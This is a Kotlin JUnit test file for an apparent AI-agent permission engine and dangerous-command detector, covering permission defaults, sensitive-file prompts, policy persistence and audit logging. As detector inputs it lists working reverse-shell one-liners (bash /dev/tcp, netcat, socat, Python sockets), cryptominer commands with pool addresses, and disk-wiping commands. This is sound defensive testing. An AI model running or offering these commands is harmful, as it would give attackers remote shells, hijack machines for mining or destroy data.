package com.vayro.app.security

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Rule
import org.junit.Test
import org.junit.rules.TemporaryFolder
import java.io.File

class PermissionPolicyExpansionTest {

    @get:Rule
    val tempFolder = TemporaryFolder()

    private lateinit var policyDir: File
    private lateinit var engine: PermissionPolicyEngine
    private lateinit var auditLogger: SecurityAuditLogger
    private lateinit var detector: DangerousCommandDetector

    @Before
    fun setUp() {
        policyDir = tempFolder.newFolder("security_expansion_policies")
        auditLogger = SecurityAuditLogger(policyDir)
        detector = DangerousCommandDetector()
        engine = PermissionPolicyEngine(
            policyDir = policyDir,
            auditLogger = auditLogger,
            commandDetector = detector
        )
    }

    @Test
    fun `baseline evaluation supports all 14 permission categories accurately`() {
        assertTrue("Enum should have at least 14 categories", PermissionCategory.values().size >= 14)
        assertTrue(PermissionCategory.values().contains(PermissionCategory.FILE_CREATE))
        assertTrue(PermissionCategory.values().contains(PermissionCategory.FILE_MODIFY))
        assertTrue(PermissionCategory.values().contains(PermissionCategory.EXTERNAL_SERVICES))
        assertTrue(PermissionCategory.values().contains(PermissionCategory.ACCESS_ENV))

        // Read operations
        val fileRead = engine.evaluatePermission(PermissionRequest(PermissionCategory.FILE_READ, "src/main.kt"))
        assertTrue("FILE_READ should be allowed by default", fileRead.allowed)

        // Local modification operations (allowed by default for standard files)
        val fileCreate = engine.evaluatePermission(PermissionRequest(PermissionCategory.FILE_CREATE, "src/NewFile.kt"))
        assertTrue("FILE_CREATE should be allowed for standard files", fileCreate.allowed)

        val fileWrite = engine.evaluatePermission(PermissionRequest(PermissionCategory.FILE_WRITE, "src/NewFile.kt"))
        assertTrue("FILE_WRITE should be allowed for standard files", fileWrite.allowed)

        val fileModify = engine.evaluatePermission(PermissionRequest(PermissionCategory.FILE_MODIFY, "src/NewFile.kt"))
        assertTrue("FILE_MODIFY should be allowed for standard files", fileModify.allowed)

        // File deletion requires prompt by default
        val fileDelete = engine.evaluatePermission(PermissionRequest(PermissionCategory.FILE_DELETE, "src/OldFile.kt"))
        assertFalse("FILE_DELETE requires prompt by default", fileDelete.allowed)
        assertTrue(fileDelete.requiresPrompt)

        // Execution & packages
        val shellExec = engine.evaluatePermission(PermissionRequest(PermissionCategory.SHELL_EXEC, "gradle build", command = "gradle build"))
        assertTrue("SHELL_EXEC should be allowed by default", shellExec.allowed)

        val installPkg = engine.evaluatePermission(PermissionRequest(PermissionCategory.INSTALL_PACKAGE, "express"))
        assertTrue("INSTALL_PACKAGE should be allowed by default", installPkg.allowed)

        val network = engine.evaluatePermission(PermissionRequest(PermissionCategory.NETWORK, "https://api.github.com"))
        assertTrue("NETWORK should be allowed by default", network.allowed)

        // Sensitive actions requiring prompt by default
        val extServices = engine.evaluatePermission(PermissionRequest(PermissionCategory.EXTERNAL_SERVICES, "https://api.openai.com"))
        assertFalse("EXTERNAL_SERVICES requires prompt by default", extServices.allowed)
        assertTrue(extServices.requiresPrompt)

        val gitCommit = engine.evaluatePermission(PermissionRequest(PermissionCategory.GIT_COMMIT, "feat: update"))
        assertTrue("GIT_COMMIT should be allowed by default", gitCommit.allowed)

        val gitBranch = engine.evaluatePermission(PermissionRequest(PermissionCategory.GIT_BRANCH, "feature/login"))
        assertTrue("GIT_BRANCH should be allowed by default", gitBranch.allowed)

        val gitPush = engine.evaluatePermission(PermissionRequest(PermissionCategory.GIT_PUSH, "origin/main"))
        assertFalse("GIT_PUSH requires prompt by default", gitPush.allowed)
        assertTrue(gitPush.requiresPrompt)

        val installApk = engine.evaluatePermission(PermissionRequest(PermissionCategory.INSTALL_APK, "app.apk"))
        assertFalse("INSTALL_APK requires prompt by default", installApk.allowed)
        assertTrue(installApk.requiresPrompt)

        val secrets = engine.evaluatePermission(PermissionRequest(PermissionCategory.SECRETS, "STRIPE_API_KEY"))
        assertFalse("SECRETS requires prompt by default", secrets.allowed)
        assertTrue(secrets.requiresPrompt)

        val accessEnv = engine.evaluatePermission(PermissionRequest(PermissionCategory.ACCESS_ENV, "PATH"))
        assertFalse("ACCESS_ENV requires prompt by default", accessEnv.allowed)
        assertTrue(accessEnv.requiresPrompt)
    }

    @Test
    fun `sensitive path boundaries protect FILE_CREATE and FILE_MODIFY as well as FILE_WRITE`() {
        val sensitiveTargets = listOf(".env", "credentials.json", "keystore.jks", "id_rsa")

        for (target in sensitiveTargets) {
            val createEval = engine.evaluatePermission(PermissionRequest(PermissionCategory.FILE_CREATE, target))
            assertFalse("FILE_CREATE for '$target' must require prompt", createEval.allowed)
            assertTrue(createEval.requiresPrompt)

            val modifyEval = engine.evaluatePermission(PermissionRequest(PermissionCategory.FILE_MODIFY, target))
            assertFalse("FILE_MODIFY for '$target' must require prompt", modifyEval.allowed)
            assertTrue(modifyEval.requiresPrompt)

            val writeEval = engine.evaluatePermission(PermissionRequest(PermissionCategory.FILE_WRITE, target))
            assertFalse("FILE_WRITE for '$target' must require prompt", writeEval.allowed)
            assertTrue(writeEval.requiresPrompt)
        }
    }

    @Test
    fun `detector blocks reverse shells with CRITICAL severity`() {
        val reverseShellCommands = listOf(
            "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1",
            "sh -i >& /dev/udp/192.168.1.100/53 0>&1",
            "nc -e /bin/bash 10.0.0.1 4444",
            "nc -c /bin/sh 10.0.0.1 4444",
            "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444",
            "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "python3 -c 'import socket,os;s=socket.socket();s.connect((\"1.2.3.4\",80));os.dup2(s.fileno(),0);os.system(\"/bin/bash\")'"
        )

        for (cmd in reverseShellCommands) {
            val eval = detector.evaluate(cmd)
            assertTrue("Expected dangerous for reverse shell: $cmd", eval.isDangerous)
            assertEquals("Expected CRITICAL severity for: $cmd", DangerSeverity.CRITICAL, eval.severity)

            // Permission engine evaluation must block with BLOCKED_DANGEROUS
            val decision = engine.evaluatePermission(
                PermissionRequest(PermissionCategory.SHELL_EXEC, cmd, command = cmd)
            )
            assertFalse("Command execution must be denied for reverse shell", decision.allowed)
            assertFalse("CRITICAL dangerous command must never prompt user", decision.requiresPrompt)
        }
    }

    @Test
    fun `detector blocks cryptocurrency miners and mining pools with CRITICAL severity`() {
        val minerCommands = listOf(
            "xmrig -o pool.supportxmr.com:3333 -u wallet",
            "minerd -a cryptonight -o stratum+tcp://xmr.pool:3333",
            "cpuminer -a sha256d -o stratum+tcp://pool.com:3333",
            "ethminer -P stratum+tcp://wallet@eth.2miners.com:2020",
            "./my-binary --stratum+tcp://xmr-node.org:5555"
        )

        for (cmd in minerCommands) {
            val eval = detector.evaluate(cmd)
            assertTrue("Expected dangerous for crypto miner: $cmd", eval.isDangerous)
            assertEquals("Expected CRITICAL severity for: $cmd", DangerSeverity.CRITICAL, eval.severity)

            val decision = engine.evaluatePermission(
                PermissionRequest(PermissionCategory.SHELL_EXEC, cmd, command = cmd)
            )
            assertFalse("Execution must be denied for crypto miner", decision.allowed)
            assertFalse("Critical danger must not prompt", decision.requiresPrompt)
        }
    }

    @Test
    fun `detector blocks disk wiping tools and flags detached daemons`() {
        val wipeCommands = listOf(
            "wipefs -a /dev/sda",
            "shred -u -z /dev/nvme0n1"
        )

        for (cmd in wipeCommands) {
            val eval = detector.evaluate(cmd)
            assertTrue("Expected dangerous for wipe command: $cmd", eval.isDangerous)
            assertEquals(DangerSeverity.CRITICAL, eval.severity)
        }

        val daemonCmd = "nohup python -m server & disown"
        val daemonEval = detector.evaluate(daemonCmd)
        assertTrue("Detached daemon spawn should be flagged", daemonEval.isDangerous)
        assertEquals(DangerSeverity.HIGH, daemonEval.severity)
    }

    @Test
    fun `policies persist and reload properly across engine instances`() {
        engine.grantPermission(PermissionCategory.GIT_PUSH, PermissionLevel.ALWAYS)
        engine.grantPermission(PermissionCategory.INSTALL_APK, PermissionLevel.ALWAYS)
        engine.grantPermission(PermissionCategory.ACCESS_ENV, PermissionLevel.DENY)
        engine.grantPermission(PermissionCategory.EXTERNAL_SERVICES, PermissionLevel.PROJECT, projectId = "my-proj")

        val reloadedEngine = PermissionPolicyEngine(
            policyDir = policyDir,
            auditLogger = SecurityAuditLogger(policyDir),
            commandDetector = detector
        )

        val globals = reloadedEngine.getAllGlobalPolicies()
        assertEquals(PermissionLevel.ALWAYS, globals[PermissionCategory.GIT_PUSH])
        assertEquals(PermissionLevel.ALWAYS, globals[PermissionCategory.INSTALL_APK])
        assertEquals(PermissionLevel.DENY, globals[PermissionCategory.ACCESS_ENV])
        assertEquals(PermissionLevel.PROJECT, reloadedEngine.getProjectPolicy("my-proj", PermissionCategory.EXTERNAL_SERVICES))

        val gitPushEval = reloadedEngine.evaluatePermission(
            PermissionRequest(PermissionCategory.GIT_PUSH, "origin/main")
        )
        assertTrue("Persisted ALWAYS policy should allow git push without prompt", gitPushEval.allowed)
        assertFalse(gitPushEval.requiresPrompt)

        val envEval = reloadedEngine.evaluatePermission(
            PermissionRequest(PermissionCategory.ACCESS_ENV, "TOKEN")
        )
        assertFalse("Persisted DENY policy should block access env", envEval.allowed)
        assertFalse(envEval.requiresPrompt)
    }

    @Test
    fun `audit logger filter and clear work end to end`() {
        auditLogger.clear()

        auditLogger.log(
            SecurityAuditEntry(
                category = PermissionCategory.SHELL_EXEC,
                action = "RUN_COMMAND",
                target = "bash -i >& /dev/tcp/1.2.3.4/80 0>&1",
                decision = AuditDecision.BLOCKED_DANGEROUS,
                reason = "Detected reverse shell pattern"
            )
        )
        auditLogger.log(
            SecurityAuditEntry(
                category = PermissionCategory.GIT_PUSH,
                action = "GIT_PUSH",
                target = "origin/feature",
                decision = AuditDecision.ALLOWED,
                reason = "Granted by user"
            )
        )
        auditLogger.log(
            SecurityAuditEntry(
                category = PermissionCategory.FILE_DELETE,
                action = "DELETE_FILE",
                target = "app/build.gradle",
                decision = AuditDecision.REQUIRES_CONFIRMATION,
                reason = "Sensitive build file"
            )
        )

        // Filter by category
        val shellLogs = auditLogger.filter(category = PermissionCategory.SHELL_EXEC)
        assertEquals(1, shellLogs.size)
        assertEquals("RUN_COMMAND", shellLogs.first().action)

        // Filter by decision
        val blockedLogs = auditLogger.filter(decision = AuditDecision.BLOCKED_DANGEROUS)
        assertEquals(1, blockedLogs.size)
        assertTrue(blockedLogs.first().reason.contains("reverse shell"))

        // Case-insensitive query
        val searchFeature = auditLogger.filter(query = "FEATURE")
        assertEquals(1, searchFeature.size)
        assertEquals("origin/feature", searchFeature.first().target)

        val searchReason = auditLogger.filter(query = "sensitive")
        assertEquals(1, searchReason.size)

        // Clear logs
        auditLogger.clear()
        assertTrue(auditLogger.getEntries(10).isEmpty())
        assertTrue(auditLogger.filter().isEmpty())
    }
}
